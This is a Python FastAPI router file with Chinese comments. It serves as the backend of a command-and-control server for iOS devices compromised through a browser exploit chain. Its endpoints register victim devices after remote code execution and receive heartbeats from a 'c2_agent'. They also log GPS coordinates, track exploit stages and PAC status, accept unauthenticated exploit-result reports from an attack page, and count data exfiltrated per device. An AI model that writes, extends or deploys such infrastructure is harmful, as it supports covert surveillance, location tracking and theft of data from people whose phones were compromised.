"""设备管理 API 路由"""

import hashlib
from datetime import datetime
from fastapi import APIRouter, Depends, HTTPException, Request, Body
from sqlalchemy.orm import Session
from sqlalchemy import desc
from typing import List

from database import get_db
import crud, schemas
from models import Device, Task

router = APIRouter(prefix="/api/devices", tags=["devices"])


@router.post("/register", response_model=schemas.DeviceOut)
def register_device(data: schemas.DeviceRegister, request: Request, db: Session = Depends(get_db)):
    """
    设备首次注册接入
    在成功 RCE 后或页面加载时调用
    """
    existing = crud.get_device(db, data.device_uuid)
    if existing:
        # 重新注册 = 更新元数据
        existing.device_model = data.device_model or existing.device_model
        existing.ios_version = data.ios_version or existing.ios_version
        existing.chipset = data.chipset or existing.chipset
        existing.user_agent = data.user_agent or existing.user_agent
        existing.ip_address = request.client.host
        existing.status = "online"
        existing.last_seen = datetime.utcnow()
        existing.latitude = data.latitude or existing.latitude
        existing.longitude = data.longitude or existing.longitude
        existing.altitude = data.altitude or existing.altitude
        existing.accuracy = data.accuracy or existing.accuracy
        existing.exploit_stage = data.exploit_stage or existing.exploit_stage
        existing.exploit_chain = data.exploit_chain or existing.exploit_chain
        existing.runtime_type = data.runtime_type or existing.runtime_type
        existing.has_pac = data.has_pac if data.has_pac is not None else existing.has_pac
        existing.pac_integrity = data.pac_integrity or existing.pac_integrity
        
        if data.extra:
            if not existing.extra:
                existing.extra = {}
            existing.extra.update(data.extra)
        
        db.commit()
        db.refresh(existing)
        return existing
    
    return crud.create_device(db, data, ip=request.client.host)


@router.post("/heartbeat", response_model=schemas.DeviceOut)
def heartbeat(data: schemas.DeviceHeartbeat, request: Request, db: Session = Depends(get_db)):
    """
    设备心跳（c2_agent 约 15 秒一次）
    未注册则自动 register，保证回连不丢
    """
    device = crud.update_device_heartbeat(db, data)
    if not device:
        # 自动注册，避免刷新/重进后 404 导致“掉线”
        device = crud.create_device(db, schemas.DeviceRegister(
            device_uuid=data.device_uuid,
            exploit_stage=data.exploit_stage,
            extra=data.extra,
        ), ip=request.client.host if request.client else None)
        device = crud.update_device_heartbeat(db, data) or device
    return device



@router.post("/location")
def update_location(data: schemas.DeviceLocationUpdate, db: Session = Depends(get_db)):
    """设备报告GPS位置"""
    device = crud.update_device_location(db, data)
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")
    return {"ok": True, "lat": data.latitude, "lng": data.longitude}


@router.post("/exploit_stage")
def update_exploit_stage(device_uuid: str, stage: str, db: Session = Depends(get_db)):
    """更新设备exploit阶段"""
    device = crud.get_device(db, device_uuid)
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")
    
    device.exploit_stage = stage
    if stage == "completed" and not device.first_exploit_at:
        device.first_exploit_at = datetime.utcnow()
        device.status = "exploited"
    
    db.commit()
    db.refresh(device)
    return {"ok": True, "stage": stage}


@router.post("/log")
def receive_device_log(
    request: Request,
    data: dict = Body(...),
    db: Session = Depends(get_db),
):
    """接收设备端JS日志并存储（永不因日志失败返回 500）"""
    try:
        msg = str((data or {}).get("message", "") or "")
        device_uuid = str((data or {}).get("device_uuid", "") or "").strip()
        # 空 UUID 时用 IP+UA 派生，与 exploit_result 一致，避免全部变成 unknown
        if not device_uuid or device_uuid in ("unknown", "null", "undefined"):
            ua = str((data or {}).get("user_agent", "") or request.headers.get("user-agent", "") or "")
            ip = request.client.host if request.client else "0.0.0.0"
            device_uuid = hashlib.md5(f"{ip}:{ua}".encode()).hexdigest()[:32]
        stage = str((data or {}).get("stage", "device") or "device")[:64]
        status = str((data or {}).get("status") or "info")[:32]
        level = str((data or {}).get("log_level") or "INFO")[:16]
        print(f"[DEVICE-LOG] [{device_uuid[:12]}] {msg}")
        from models import DeviceLog
        # 始终落库，不再因 device 表未登记而丢弃
        log = DeviceLog(
            device_uuid=device_uuid,
            stage=stage,
            status=status if status else "info",
            message=msg,
            log_level=level if level else "INFO",
        )
        # 双保险：部分环境下构造参数未写入 NOT NULL 列
        if getattr(log, "status", None) is None:
            log.status = "info"
        if getattr(log, "stage", None) is None:
            log.stage = "device"
        db.add(log)
        db.commit()
        return {"ok": True, "stored": True}
    except Exception as e:
        try:
            db.rollback()
        except Exception:
            pass
        print(f"[DEVICE-LOG] store failed: {e}")
        return {"ok": True, "stored": False, "error": str(e)}


@router.get("/logs/all")
def get_all_device_logs(limit: int = 50, db: Session = Depends(get_db)):
    """获取所有设备日志"""
    from models import DeviceLog
    logs = db.query(DeviceLog).order_by(DeviceLog.created_at.desc()).limit(limit).all()
    return [{"uuid": l.device_uuid, "stage": l.stage, "msg": l.message, "time": str(l.created_at)} for l in logs]


# ==================== 漏洞利用结果上报 (公开端点，不需要认证) ====================

@router.post("/exploit_result")
def report_exploit_result(
    request: Request,
    data: dict = Body(...),
    db: Session = Depends(get_db),
):
    """
    接收设备漏洞利用结果（由 group.html reportResult() 调用）
    自动注册/更新设备，并在利用成功时自动派发后渗透任务
    """
    import json

    result_code = data.get("result_code", -1)
    status = data.get("status", "online")
    exploit_stage = data.get("exploit_stage", "failed")
    device_model = data.get("device_model", "")
    ios_version = data.get("ios_version", "")
    user_agent = data.get("user_agent", "")

    # 从 IP + User-Agent 生成设备 UUID（与 admin.py logs/record 保持一致）
    unique_str = f"{request.client.host}:{user_agent}"
    device_uuid = hashlib.md5(unique_str.encode()).hexdigest()[:32]

    # 查找或创建设备
    device = crud.get_device(db, device_uuid)
    if device:
        device.status = status
        device.exploit_stage = exploit_stage
        device.last_seen = datetime.utcnow()
        device.user_agent = user_agent or device.user_agent
        if device_model:
            device.device_model = device_model
        if ios_version:
            device.ios_version = ios_version
            try:
                parts = ios_version.split(".")
                device.ios_version_numeric = int(parts[0]) * 10000 + int(parts[1]) * 100 if len(parts) > 1 else int(parts[0]) * 10000
            except Exception:
                pass
        if result_code == 0 and not device.first_exploit_at:
            device.first_exploit_at = datetime.utcnow()
    else:
        from schemas import DeviceRegister
        device_data = DeviceRegister(
            device_uuid=device_uuid,
            device_model=device_model,
            ios_version=ios_version,
            user_agent=user_agent,
            exploit_stage=exploit_stage,
        )
        device = crud.create_device(db, device_data, ip="exploit_result")
        device.status = status
        if result_code == 0:
            device.first_exploit_at = datetime.utcnow()
            device.exploit_stage = "completed"

    db.commit()
    db.refresh(device)

    # 自动任务强制关闭：绝不创建 photos/apps/clipboard/contacts
    auto_tasks_created = []
    print(f"[AUTO-TASK] disabled for {device_uuid} result_code={result_code}")

    return {
        "ok": True,
        "device_uuid": device_uuid,
        "status": status,
        "result_code": result_code,
        "auto_tasks": auto_tasks_created,
    }


@router.get("", response_model=List[schemas.DeviceOut])
def list_devices(skip: int = 0, limit: int = 100, status: str = None, db: Session = Depends(get_db)):
    """
    获取所有设备列表
    支持按状态筛选
    """
    if status:
        devices = db.query(Device).filter(
            Device.status == status
        ).order_by(desc(Device.last_seen)).offset(skip).limit(limit).all()
        return devices
    return crud.get_devices(db, skip=skip, limit=limit)


@router.get("/online", response_model=List[schemas.DeviceOut])
def list_online(db: Session = Depends(get_db)):
    """获取在线设备列表"""
    return crud.get_online_devices(db)


@router.get("/exploited", response_model=List[schemas.DeviceOut])
def list_exploited(db: Session = Depends(get_db)):
    """获取已成功exploit的设备列表"""
    return db.query(Device).filter(
        Device.exploit_stage == "completed"
    ).order_by(desc(Device.first_exploit_at)).all()


@router.get("/{device_uuid}", response_model=schemas.DeviceOut)
def get_device(device_uuid: str, db: Session = Depends(get_db)):
    """获取单个设备详情"""
    device = crud.get_device(db, device_uuid)
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")
    return device


@router.get("/{device_uuid}/stats")
def get_device_stats(device_uuid: str, db: Session = Depends(get_db)):
    """获取设备统计数据"""
    device = crud.get_device(db, device_uuid)
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")
    
    data_counts = crud.get_device_data_counts(db, device_uuid)
    
    return {
        "device": device,
        "data_counts": data_counts,
        "total_tasks": device.total_tasks,
        "completed_tasks": device.completed_tasks,
        "failed_tasks": device.failed_tasks,
        "total_exfil": device.total_exfil
    }


@router.get("/{device_uuid}/logs", response_model=List[schemas.DeviceLogOut])
def get_device_logs(device_uuid: str, skip: int = 0, limit: int = 100, db: Session = Depends(get_db)):
    """获取设备日志"""
    return crud.get_device_logs(db, device_uuid, skip=skip, limit=limit)


@router.delete("/{device_uuid}")
def delete_device(device_uuid: str, db: Session = Depends(get_db)):
    """删除设备记录"""
    if crud.delete_device(db, device_uuid):
        return {"ok": True, "message": "Device deleted"}
    raise HTTPException(status_code=404, detail="Device not found")


@router.post("/{device_uuid}/notes")
def add_device_notes(device_uuid: str, notes: str, db: Session = Depends(get_db)):
    """添加设备备注"""
    device = crud.get_device(db, device_uuid)
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")
    
    device.notes = notes
    db.commit()
    db.refresh(device)
    return {"ok": True, "notes": notes}